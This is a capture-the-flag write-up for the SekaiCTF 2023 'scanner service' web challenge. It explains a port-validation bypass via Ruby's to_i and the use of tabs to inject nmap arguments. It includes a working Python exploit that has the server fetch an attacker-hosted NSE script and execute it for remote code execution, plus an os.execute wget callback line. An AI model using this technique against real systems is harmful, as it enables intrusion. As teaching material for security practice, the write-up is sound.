---
title: "scanner service - sekaictf 2023"
category: "web"
subcategory: "web"
type: "writeup"
tags: ["web", "nmap", "scanner", "service", "web-exploitation", "scanner-service"]
summary: "Inspecting the source code, we find that the app provides options to scan a user specified host port pair using nmap, and passes the user input to the shell."
source:
  name: "project-sekai-ctf/sekaictf-2023"
  url: "https://github.com/project-sekai-ctf/sekaictf-2023/blob/4dc0f1fb2836c64b3a502e2538ba32530996b8c9/web/scanner-service/solution/README.md"
ctf:
  name: "sekaictf"
  year: 2023
  challenge: "scanner service"
---

## Source

- **CTF:** sekaictf 2023
- **Challenge:** scanner service
- **Repository:** [project-sekai-ctf/sekaictf-2023](https://github.com/project-sekai-ctf/sekaictf-2023)
- **File:** <https://github.com/project-sekai-ctf/sekaictf-2023/blob/4dc0f1fb2836c64b3a502e2538ba32530996b8c9/web/scanner-service/solution/README.md>

---
## Sekai Web-Scanner Writeup

Inspecting the source code, we find that the app provides options to scan a user specified host port pair using nmap, and passes the user input to the shell. However, there are some protections in place, which validate both the host and port. They are all located in the helper module.

Let's examine first `valid_port`:
```ruby
def valid_port?(input)
  !input.nil? and (1..65535).cover?(input.to_i)
end
```

It first checks whether the given value is defined and then converts it to an integer in order to check whether it lies in a valid port range. Checking the documentation, we notice that `to_i` will try to interpret the leading characters as an int, even if the characters following are not decimals:

```ruby
"99 red balloons".to_i   #=> 99
```

This allows to bypass the checks for a valid port.

Lets continue with `valid_ip`, which uses a regex to validate whether a string is a valid ipv4:

```ruby
def valid_ip?(input)
  pattern = /\A((25[0-5]|2[0-4]\d|[01]?\d{1,2})\.){3}(25[0-5]|2[0-4]\d|[01]?\d{1,2})\z/
  !input.nil? and !!(input =~ pattern)
end
```

The regex is safe - notice the anchor flags, we can't just inject a newline to bypass these checks.

The `escape_shell_input` is called on our specified parameter before the two previous checks are invoked. We can see that there are some shell characters escaped. However, tabs are not blocked. 

Lets take a look at the endpoint:

```ruby
input_service = escape_shell_input(params[:service])
hostname, port = input_service.split ':', 2

...

if valid_ip? hostname and valid_port? port
  # Service up?
  s = TCPSocket.new(hostname, port.to_i)
  s.close
  # Assuming valid ip and port, this should be fine
  @scan_result = IO.popen("nmap -p #{port} #{hostname}").read
else
  @scan_result = "Invalid input detected, aborting scan!"
end
```

Since we can use tabs, we can inject further arguments. We can abuse nmap's script engine to both exfil files and rce. In this writeup, we go for the latter, using the following steps:

1. Create a nmap script to be executed. We will refer to it as `evil.nse`:
```bash
$ cat evil.nse
os.execute("wget 127.0.0.1:8080/pwned")
```

> Make sure to use either port 80 or 8080, otherwise the exploit wont complete successfully.

2. Use `--script http-fetch` to download this script to the remote machine
3. Execute the script

The steps are summarized in the following script:
```python
#!/usr/bin/python3
import requests
import random
import string
import time
import sys
import re


def random_string(length=10):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} <lhost> <lport>")
    exit(1)

TARGET = "http://scanner-service.chals.sekai.team/"
LHOST = sys.argv[1]
LPORT = int(sys.argv[2])
NSE_SCRIPT = "evil.nse"
DOWNLOAD_DIR = "/tmp/" + random_string()

with open(NSE_SCRIPT, "w") as f:
    f.write("os.execute('cat /flag*')")

requests.post(
    TARGET,
    data=f"service={LHOST}:{LPORT} --script http-fetch -Pn --script-args http-fetch.destination={DOWNLOAD_DIR},http-fetch.url={NSE_SCRIPT}".replace(
        " ", "\t"
    ),
)

print("You should now receive a request on your http server")

time.sleep(5)

# execute nse script
response = requests.post(
    TARGET,
    data=f"service={LHOST}:{LPORT} --script={DOWNLOAD_DIR}/{LHOST}/{LPORT}/{NSE_SCRIPT}".replace(
        " ", "\t"
    ),
)

matches = re.search(r"SEKAI\{[^\}]+\}", response.text)
if matches:
    print("Flag:", matches.group(0))
else:
    print("We failed?")
```
